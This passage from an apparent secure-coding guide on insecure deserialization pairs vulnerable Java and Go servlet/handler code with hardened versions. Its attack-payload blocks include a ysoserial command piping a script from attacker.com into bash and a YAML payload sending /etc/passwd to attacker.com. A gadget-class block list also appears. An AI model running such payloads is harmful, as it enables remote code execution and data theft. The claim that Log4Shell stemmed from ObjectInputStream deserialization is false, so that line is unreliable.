  throw new Error('Payload expired');
}
```

**Additional Protections**:
- **Input size limits**: `express.json({ limit: '10kb' })` prevents DoS via large payloads
- **Schema validation**: Ajv validates structure before and after deserialization
- **Rate limiting**: Prevents brute-force attacks on integrity verification
- **Audit logging**: All serialization/deserialization events are logged for incident response
- **Security headers**: Helmet.js adds CSP, X-Frame-Options, etc.
- **Environment isolation**: Different secrets for dev/staging/production

Using `ObjectInputStream` directly on untrusted data is extremely dangerous and has been the root cause of some of the most severe vulnerabilities in Java history, including the Log4Shell vulnerability that affected millions of applications.

**VULNERABLE CODE**:

```java
import java.io.*;
import javax.servlet.http.*;
import java.util.Base64;

public class UserSessionServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // VULNERABLE: Deserializing untrusted user input
        String sessionData = request.getParameter("session");

        if (sessionData != null) {
            byte[] data = Base64.getDecoder().decode(sessionData);
            ByteArrayInputStream bais = new ByteArrayInputStream(data);

            // DANGEROUS: ObjectInputStream on untrusted data
            ObjectInputStream ois = new ObjectInputStream(bais);
            try {
                Object userSession = ois.readObject();  // RCE happens here!
                request.getSession().setAttribute("user", userSession);
            } catch (ClassNotFoundException e) {
                response.sendError(400, "Invalid session");
            }
        }
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized object that executes system command
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0

# The resulting base64 string is sent as the 'session' parameter
# When deserialized, it executes: curl http://attacker.com/shell.sh | bash
```

**Why This Is Dangerous**:
- Java deserialization can trigger arbitrary code execution through gadget chains
- Attacker doesn't need valid credentials - just needs to reach the endpoint
- Libraries like Commons Collections, Spring, Hibernate contain exploitable gadgets
- The malicious code executes with the same privileges as the application
- No authentication or authorization can prevent this if the code path is reachable

**SECURE VERSION**:

```java
import java.io.*;
import javax.servlet.http.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureUserSessionServlet extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SecureUserSessionServlet.class);

    // SECURE: Use JSON with strict type handling instead of Java serialization
    private static final ObjectMapper mapper = JsonMapper.builder()
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
        .build();

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String sessionJson = request.getParameter("session");

        if (sessionJson == null || sessionJson.isEmpty()) {
            response.sendError(400, "Missing session data");
            return;
        }

        try {
            // SECURE: Deserialize to specific, known type only
            UserSession userSession = mapper.readValue(sessionJson, UserSession.class);

            // Additional validation
            if (!isValidSession(userSession)) {
                logger.warn("Invalid session attempt from IP: {}", request.getRemoteAddr());
                response.sendError(403, "Invalid session");
                return;
            }

            request.getSession().setAttribute("user", userSession);
            response.setStatus(200);

        } catch (Exception e) {
            logger.error("Session deserialization failed from IP: {}", request.getRemoteAddr());
            response.sendError(400, "Invalid session format");
        }
    }

    private boolean isValidSession(UserSession session) {
        return session != null 
            && session.getUserId() > 0 
            && session.getExpiry() > System.currentTimeMillis();
    }
}

// Immutable data class - no dangerous methods
public final class UserSession implements Serializable {
    private final long userId;
    private final String username;
    private final long expiry;

    public UserSession(long userId, String username, long expiry) {
        this.userId = userId;
        this.username = username;
        this.expiry = expiry;
    }

    public long getUserId() { return userId; }
    public String getUsername() { return username; }
    public long getExpiry() { return expiry; }
}
```

**Key Security Controls**:
- **Use JSON instead of Java serialization**: JSON cannot trigger code execution during parsing
- **Deserialize to specific types**: `readValue(json, UserSession.class)` only creates UserSession objects
- **Immutable data classes**: No setters or dangerous methods that could be exploited
- **Input validation**: Verify the deserialized data makes sense for your business logic

If you absolutely must use Java serialization for legacy systems, you need multiple layers of defense. The key is implementing a strict whitelist filter that only allows known-safe classes to be deserialized.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import javax.servlet.http.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SafeDeserializationServlet extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SafeDeserializationServlet.class);
    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    // Track deserialization attempts for anomaly detection
    private static final Map<String, Integer> suspiciousAttempts = new ConcurrentHashMap<>();
    private static final int MAX_ATTEMPTS_PER_MINUTE = 5;

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String clientIP = request.getRemoteAddr();

        // Rate limiting for deserialization endpoints
        if (isRateLimited(clientIP)) {
            securityLogger.warn("RATE_LIMIT_EXCEEDED: IP={} endpoint=deserialize", clientIP);
            response.sendError(429, "Too many requests");
            return;
        }

        String encodedData = request.getParameter("data");
        if (encodedData == null || encodedData.length() > 10000) {
            response.sendError(400, "Invalid data");
            return;
        }

        try {
            byte[] data = Base64.getDecoder().decode(encodedData);

            // Use secure deserialization with whitelist
            Object result = safeDeserialize(data, clientIP);

            if (result instanceof UserSession) {
                UserSession session = (UserSession) result;
                if (validateSession(session)) {
                    request.getSession().setAttribute("user", session);
                    response.setStatus(200);
                } else {
                    response.sendError(403, "Invalid session");
                }
            } else {
                response.sendError(400, "Unexpected data type");
            }

        } catch (SecurityException e) {
            securityLogger.error("DESERIALIZATION_ATTACK: IP={} reason={}", clientIP, e.getMessage());
            response.sendError(403, "Forbidden");
        } catch (Exception e) {
            logger.error("Deserialization error", e);
            response.sendError(400, "Invalid data format");
        }
    }

    private Object safeDeserialize(byte[] data, String clientIP) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);

        // Use custom ObjectInputStream with strict whitelist
        try (SafeObjectInputStream sois = new SafeObjectInputStream(bais, clientIP)) {
            return sois.readObject();
        }
    }

    private boolean isRateLimited(String clientIP) {
        int attempts = suspiciousAttempts.merge(clientIP, 1, Integer::sum);
        return attempts > MAX_ATTEMPTS_PER_MINUTE;
    }

    private boolean validateSession(UserSession session) {
        return session.getExpiry() > System.currentTimeMillis()
            && session.getUserId() > 0;
    }
}

/**
 * Custom ObjectInputStream with strict class whitelist.
 * This is the PRIMARY defense against deserialization attacks.
 */
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    // STRICT WHITELIST: Only these classes can be deserialized
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.model.UserSession",
        "java.lang.String",
        "java.lang.Long",
        "java.lang.Integer",
        "java.util.Date",
        "[B"  // byte array
    );

    // Known dangerous classes that indicate attack attempts
    private static final Set<String> DANGEROUS_PATTERNS = Set.of(
        "org.apache.commons.collections",
        "org.apache.xalan",
        "javax.management",
        "com.sun.org.apache.xalan",
        "org.springframework.beans.factory",
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "javax.script.ScriptEngine",
        "com.mchange.v2.c3p0",
        "org.hibernate.engine",
        "ysoserial",
        "Pwner"
    );

    private final String clientIP;

    public SafeObjectInputStream(InputStream in, String clientIP) throws IOException {
        super(in);
        this.clientIP = clientIP;
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {

        String className = desc.getName();

        // Check for known attack patterns first
        for (String dangerous : DANGEROUS_PATTERNS) {
            if (className.contains(dangerous)) {
                securityLogger.error(
                    "DESERIALIZATION_ATTACK_BLOCKED: IP={} class={} pattern={}",
                    clientIP, className, dangerous
                );
                throw new SecurityException("Blocked dangerous class: " + className);
            }
        }

        // Only allow explicitly whitelisted classes
        if (!ALLOWED_CLASSES.contains(className)) {
            securityLogger.warn(
                "DESERIALIZATION_BLOCKED: IP={} class={} reason=not_whitelisted",
                clientIP, className
            );
            throw new SecurityException("Class not in whitelist: " + className);
        }

        return super.resolveClass(desc);
    }
}

/**
 * Safe serializable class with custom serialization.
 */
public final class UserSession implements Serializable {
    @Serial
    private static final long serialVersionUID = 1L;

    private final long userId;
    private final String username;
    private final long expiry;
    private final String signature;  // HMAC for integrity

    private static final String HMAC_KEY = System.getenv("SESSION_HMAC_KEY");

    public UserSession(long userId, String username, long expiry) {
        this.userId = userId;
        this.username = username;
        this.expiry = expiry;
        this.signature = computeSignature();
    }

    // Custom deserialization with integrity check
    @Serial
    private void readObject(ObjectInputStream ois) 
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();

        // Verify integrity after deserialization
        if (!verifySignature()) {
            throw new InvalidObjectException("Session signature verification failed");
        }
    }

    private String computeSignature() {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(HMAC_KEY.getBytes(), "HmacSHA256"));
            String data = userId + ":" + username + ":" + expiry;
            return Base64.getEncoder().encodeToString(mac.doFinal(data.getBytes()));
        } catch (Exception e) {
            throw new RuntimeException("Failed to compute signature", e);
        }
    }

    private boolean verifySignature() {
        return MessageDigest.isEqual(
            signature.getBytes(),
            computeSignature().getBytes()
        );
    }

    public long getUserId() { return userId; }
    public String getUsername() { return username; }
    public long getExpiry() { return expiry; }
}
```

**Defense in Depth Layers**:

1. **Class Whitelist Filter** (Primary Defense):
```java
// Only explicitly allowed classes can be deserialized
if (!ALLOWED_CLASSES.contains(className)) {
    throw new SecurityException("Class not in whitelist");
}
```

2. **Dangerous Pattern Detection** (Attack Detection):
```java
// Detect known gadget chain classes
for (String dangerous : DANGEROUS_PATTERNS) {
    if (className.contains(dangerous)) {
        securityLogger.error("ATTACK_BLOCKED: {}", className);
        throw new SecurityException("Blocked");
    }
}
```

3. **Cryptographic Integrity Verification** (Data Integrity):
```java
// HMAC signature in serialized objects
private void readObject(ObjectInputStream ois) {
    ois.defaultReadObject();
    if (!verifySignature()) {
        throw new InvalidObjectException("Tampering detected");
    }
}
```

**Additional Protections**:

- **Use Java's built-in deserialization filters (Java 9+)**:
```java
// In JVM startup or system property
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;!*"
);
ObjectInputFilter.Config.setSerialFilter(filter);
```

- **Remove vulnerable libraries from classpath**: Audit dependencies for known gadget chain classes (Commons Collections < 3.2.2, etc.)

- **Network segmentation**: Isolate services that must use deserialization

- **Consider serialization proxies** for complex objects:
```java
private Object writeReplace() {
    return new SessionProxy(userId, username, expiry);
}
```

- **Monitor and alert on blocked attempts**: Any blocked deserialization class should trigger security alerts for investigation

YAML deserialization in Go can be dangerous if you unmarshal into interface{} or use features that allow arbitrary type instantiation. Unlike Python's pickle, Go's yaml package is safer by default, but there are still pitfalls around dynamic types and encoding/gob combinations.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/gob"
	"bytes"
	"fmt"
	"net/http"
	"os/exec"
	"gopkg.in/yaml.v3"
)

// Dangerous: Registered type that can execute commands
type Command struct {
	Name string
	Args []string
}

func (c *Command) Execute() (string, error) {
	out, err := exec.Command(c.Name, c.Args...).Output()
	return string(out), err
}

func init() {
	// Registering types for gob makes them deserializable
	gob.Register(&Command{})
}

// VULNERABLE: Deserializes untrusted data into interface{}
func loadConfig(w http.ResponseWriter, r *http.Request) {
	var config interface{}

	// Dangerous: Accepts untrusted YAML from request body
	err := yaml.NewDecoder(r.Body).Decode(&config)
	if err != nil {
		http.Error(w, "Invalid YAML", 400)
		return
	}

	// Dangerous: Type assertion and execution based on untrusted data
	if configMap, ok := config.(map[string]interface{}); ok {
		if cmdData, exists := configMap["command"]; exists {
			if cmdMap, ok := cmdData.(map[string]interface{}); ok {
				cmd := &Command{
					Name: cmdMap["name"].(string),
					Args: toStringSlice(cmdMap["args"]),
				}
				output, _ := cmd.Execute() // RCE!
				fmt.Fprintf(w, "Output: %s", output)
			}
		}
	}
}

func toStringSlice(i interface{}) []string {
	var result []string
	if arr, ok := i.([]interface{}); ok {
		for _, v := range arr {
			result = append(result, fmt.Sprintf("%v", v))
		}
	}
	return result
}
```

**Attack Payload**:
```yaml
command:
  name: "/bin/sh"
  args:
    - "-c"
    - "curl https://attacker.com/steal?data=$(cat /etc/passwd | base64)"
```

**Why This Is Dangerous**:
- Unmarshaling into `interface{}` allows arbitrary structure from untrusted input
- Dynamic type instantiation based on user-controlled data enables code execution
- Command execution types should never be instantiated from external input
- No validation of what commands or types are allowed

**SECURE VERSION**:

```go
package main

import (
	"fmt"
	"net/http"
	"regexp"
	"gopkg.in/yaml.v3"
)

// SECURE: Strictly typed configuration struct
type AppConfig struct {
	Database DatabaseConfig `yaml:"database"`
	Server   ServerConfig   `yaml:"server"`
	Logging  LogConfig      `yaml:"logging"`
}

type DatabaseConfig struct {
	Host     string `yaml:"host"`
	Port     int    `yaml:"port"`
	Name     string `yaml:"name"`
	SSLMode  string `yaml:"ssl_mode"`
}

type ServerConfig struct {
	Port         int    `yaml:"port"`
	ReadTimeout  int    `yaml:"read_timeout"`
	WriteTimeout int    `yaml:"write_timeout"`
}

type LogConfig struct {
	Level  string `yaml:"level"`
	Format string `yaml:"format"`
}

var (
	allowedHosts    = regexp.MustCompile(`^[a-zA-Z0-9.-]+$`)
	allowedLogLevel = map[string]bool{"debug": true, "info": true, "warn": true, "error": true}
	allowedSSLModes = map[string]bool{"disable": true, "require": true, "verify-full": true}
)

// SECURE: Deserialize into strictly typed struct with validation
func loadConfigSecure(w http.ResponseWriter, r *http.Request) {
	var config AppConfig

	// Decode into strictly typed struct - prevents arbitrary types
	err := yaml.NewDecoder(r.Body).Decode(&config)
	if err != nil {
		http.Error(w, "Invalid configuration format", 400)
		return
	}

	// Validate all fields after deserialization
	if err := validateConfig(&config); err != nil {
		http.Error(w, fmt.Sprintf("Invalid configuration: %v", err), 400)
		return
	}

	fmt.Fprintf(w, "Configuration loaded successfully")
}

func validateConfig(config *AppConfig) error {
	// Validate database host
	if !allowedHosts.MatchString(config.Database.Host) {
		return fmt.Errorf("invalid database host")
	}

	// Validate ports are in valid range
	if config.Database.Port < 1 || config.Database.Port > 65535 {
		return fmt.Errorf("invalid database port")
	}
	if config.Server.Port < 1 || config.Server.Port > 65535 {
		return fmt.Errorf("invalid server port")
	}

	// Validate SSL mode against allowlist
	if !allowedSSLModes[config.Database.SSLMode] {
		return fmt.Errorf("invalid SSL mode")
	}

	// Validate log level against allowlist
	if !allowedLogLevel[config.Logging.Level] {
		return fmt.Errorf("invalid log level")
	}

	return nil
}
```

**Key Security Controls**:
- **Strict typing**: Unmarshal into concrete struct types, never `interface{}`
- **Input validation**: Validate all fields after deserialization against allowlists
- **No executable types**: Configuration structs contain only data, no methods that execute commands

Gob is particularly dangerous because it supports interface types and registered types that can be instantiated during deserialization. For RPC and caching, you need strict controls on what can be deserialized and cryptographic verification of data integrity.

**PRODUCTION PATTERN**:

```go
package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/gob"
	"errors"
	"fmt"
	"log"
	"sync"
	"time"
)

// SafeSerializable marks types that are explicitly allowed for serialization
type SafeSerializable interface {
	IsSafeForSerialization() bool
}

// Allowed data types - no methods that can execute code
type UserSession struct {
	UserID    string    `json:"user_id"`
	Email     string    `json:"email"`
	Roles     []string  `json:"roles"`
	ExpiresAt time.Time `json:"expires_at"`
	CreatedAt time.Time `json:"created_at"`
}

func (u UserSession) IsSafeForSerialization() bool { return true }

type CacheEntry struct {
	Key       string    `json:"key"`
	Value     []byte    `json:"value"`
	ExpiresAt time.Time `json:"expires_at"`
}

func (c CacheEntry) IsSafeForSerialization() bool { return true }

// SecureSerializer handles serialization with integrity verification
type SecureSerializer struct {
	hmacKey         []byte
	allowedTypes    map[string]bool
	maxPayloadSize  int
	typeMutex       sync.RWMutex
}

func NewSecureSerializer(hmacKey []byte) *SecureSerializer {
	s := &SecureSerializer{
		hmacKey:        hmacKey,
		allowedTypes:   make(map[string]bool),
		maxPayloadSize: 1024 * 1024, // 1MB max
	}

	// Explicitly register ONLY safe types
	s.RegisterSafeType("UserSession")
	s.RegisterSafeType("CacheEntry")

	return s
}

func (s *SecureSerializer) RegisterSafeType(typeName string) {
	s.typeMutex.Lock()
	defer s.typeMutex.Unlock()
	s.allowedTypes[typeName] = true
}

func (s *SecureSerializer) isTypeAllowed(typeName string) bool {
	s.typeMutex.RLock()
	defer s.typeMutex.RUnlock()
	return s.allowedTypes[typeName]
}

// SignedPayload wraps serialized data with integrity protection
type SignedPayload struct {
	TypeName  string
	Data      []byte
	Timestamp int64
	Signature []byte
}

// Serialize with type checking and HMAC signature
func (s *SecureSerializer) Serialize(typeName string, data SafeSerializable) ([]byte, error) {
	// Verify type is allowed
	if !s.isTypeAllowed(typeName) {
		return nil, fmt.Errorf("type %s is not allowed for serialization", typeName)
	}

	// Verify interface implementation
	if !data.IsSafeForSerialization() {
		return nil, errors.New("data type is not marked as safe for serialization")
	}

	// Serialize the data
	var dataBuf bytes.Buffer
	if err := gob.NewEncoder(&dataBuf).Encode(data); err != nil {
		return nil, fmt.Errorf("serialization failed: %w", err)
	}

	// Check size limits
	if dataBuf.Len() > s.maxPayloadSize {
		return nil, errors.New("payload exceeds maximum size")
	}

	// Create signed payload
	payload := SignedPayload{
		TypeName:  typeName,
		Data:      dataBuf.Bytes(),
		Timestamp: time.Now().Unix(),
	}

	// Generate HMAC signature
	payload.Signature = s.generateSignature(payload)

	// Encode final payload
	var finalBuf bytes.Buffer
	if err := gob.NewEncoder(&finalBuf).Encode(payload); err != nil {
		return nil, fmt.Errorf("payload encoding failed: %w", err)
	}

	return finalBuf.Bytes(), nil
}

// Deserialize with signature verification and type checking
func (s *SecureSerializer) Deserialize(data []byte, target SafeSerializable) error {
	// Check size before processing
	if len(data) > s.maxPayloadSize {
		return errors.New("payload exceeds maximum size")
	}

	// Decode the signed payload
	var payload SignedPayload
	if err := gob.NewDecoder(bytes.NewReader(data)).Decode(&payload); err != nil {
		log.Printf("[SECURITY] Failed to decode payload: %v", err)
		return errors.New("invalid payload format")
	}

	// CRITICAL: Verify signature BEFORE any further processing
	expectedSig := s.generateSignature(payload)
	if !hmac.Equal(payload.Signature, expectedSig) {
		log.Printf("[SECURITY] Signature verification failed for type: %s", payload.TypeName)
		return errors.New("signature verification failed - data may be tampered")
	}

	// Verify type is in allowlist
	if !s.isTypeAllowed(payload.TypeName) {
		log.Printf("[SECURITY] Attempted deserialization of disallowed type: %s", payload.TypeName)
		return fmt.Errorf("type %s is not allowed", payload.TypeName)
	}

	// Check timestamp to prevent replay attacks (5 minute window)
	if time.Now().Unix()-payload.Timestamp > 300 {
		log.Printf("[SECURITY] Expired payload timestamp: %d", payload.Timestamp)
		return errors.New("payload has expired")
	}

	// Only now deserialize the actual data
	if err := gob.NewDecoder(bytes.NewReader(payload.Data)).Decode(target); err != nil {
		return fmt.Errorf("data deserialization failed: %w", err)
	}

	log.Printf("[AUDIT] Successfully deserialized type: %s", payload.TypeName)
	return nil
}

func (s *SecureSerializer) generateSignature(payload SignedPayload) []byte {
	h := hmac.New(sha256.New, s.hmacKey)
	h.Write([]byte(payload.TypeName))
	h.Write(payload.Data)
	h.Write([]byte(fmt.Sprintf("%d", payload.Timestamp)))
	return h.Sum(nil)
}

// Example usage
func main() {
	// Initialize with secure key (should be from secure key management)
	hmacKey := []byte("your-32-byte-secret-key-here!!!")
	serializer := NewSecureSerializer(hmacKey)

	// Serialize a session
	session := UserSession{
		UserID:    "user-12345",
		Email:     "user@example.com",
		Roles:     []string{"user", "editor"},
		ExpiresAt: time.Now().Add(24 * time.Hour),
		CreatedAt: time.Now(),
	}

	data, err := serializer.Serialize("UserSession", session)
	if err != nil {
		log.Fatalf("Serialization failed: %v", err)
	}

	fmt.Printf("Serialized data: %s\n", base64.StdEncoding.EncodeToString(data))

	// Deserialize
	var loadedSession UserSession
	if err := serializer.Deserialize(data, &loadedSession); err != nil {
		log.Fatalf("Deserialization failed: %v", err)
	}

	fmt.Printf("Loaded session for user: %s\n", loadedSession.UserID)
}
```

**Defense in Depth Layers**:

1. **Type Allowlisting**:
```go
// Only explicitly registered types can be deserialized
func (s *SecureSerializer) isTypeAllowed(typeName string) bool {
    s.typeMutex.RLock()
    defer s.typeMutex.RUnlock()
    return s.allowedTypes[typeName]
}
```

2. **Cryptographic Integrity Verification**:
```go
// HMAC signature verified BEFORE deserialization
expectedSig := s.generateSignature(payload)
if !hmac.Equal(payload.Signature, expectedSig) {
    return errors.New("signature verification failed")
}
```

3. **Replay Attack Prevention**:
```go
// Timestamp validation prevents reuse of old payloads
if time.Now().Unix()-payload.Timestamp > 300 {
    return errors.New("payload has expired")
}
```

**Additional Protections**:
- **Size limits**: Prevent denial-of-service through oversized payloads
- **SafeSerializable interface**: Marker interface ensures only intended types are serialized
- **Audit logging**: All serialization/deserialization events are logged with security context
- **Key rotation support**: HMAC keys should be rotated periodically using key management service
- **Consider alternatives**: For RPC, prefer Protocol Buffers or gRPC with strict schemas over gob
- **Network isolation**: Limit RPC endpoints to internal networks with mTLS

